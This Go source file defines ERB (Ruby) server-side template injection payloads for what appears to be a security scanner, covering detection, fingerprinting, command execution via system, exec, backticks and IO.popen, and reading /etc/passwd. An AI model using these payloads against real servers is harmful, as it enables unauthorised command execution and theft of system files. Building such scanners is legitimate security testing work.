package ssti

// ERB payloads (Ruby).
// Source: PayloadsAllTheThings, HackTricks
var erbPayloads = []Payload{
	// Detection payloads
	{
		Value:           "<%= 7*7 %>",
		Engine:          EngineERB,
		Type:            TypeDetection,
		Description:     "Basic ERB math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "<%= 7+7 %>",
		Engine:          EngineERB,
		Type:            TypeDetection,
		Description:     "ERB addition",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "14",
	},
	// Fingerprint payloads
	{
		Value:           "<%= self %>",
		Engine:          EngineERB,
		Type:            TypeFingerprint,
		Description:     "ERB self object",
		DetectionMethod: MethodReflection,
	},
	{
		Value:           "<%= self.class %>",
		Engine:          EngineERB,
		Type:            TypeFingerprint,
		Description:     "ERB class introspection",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Object",
	},
	// RCE payloads
	{
		Value:           "<%= system('id') %>",
		Engine:          EngineERB,
		Type:            TypeRCE,
		Description:     "ERB system command",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "<%= `id` %>",
		Engine:          EngineERB,
		Type:            TypeRCE,
		Description:     "ERB backtick command",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "<%= exec('id') %>",
		Engine:          EngineERB,
		Type:            TypeRCE,
		Description:     "ERB exec command",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "<%= IO.popen('id').read() %>",
		Engine:          EngineERB,
		Type:            TypeRCE,
		Description:     "ERB IO.popen command",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// File read
	{
		Value:           "<%= File.read('/etc/passwd') %>",
		Engine:          EngineERB,
		Type:            TypeFileRead,
		Description:     "ERB file read",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
	{
		Value:           "<%= File.open('/etc/passwd').read %>",
		Engine:          EngineERB,
		Type:            TypeFileRead,
		Description:     "ERB file open read",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
}
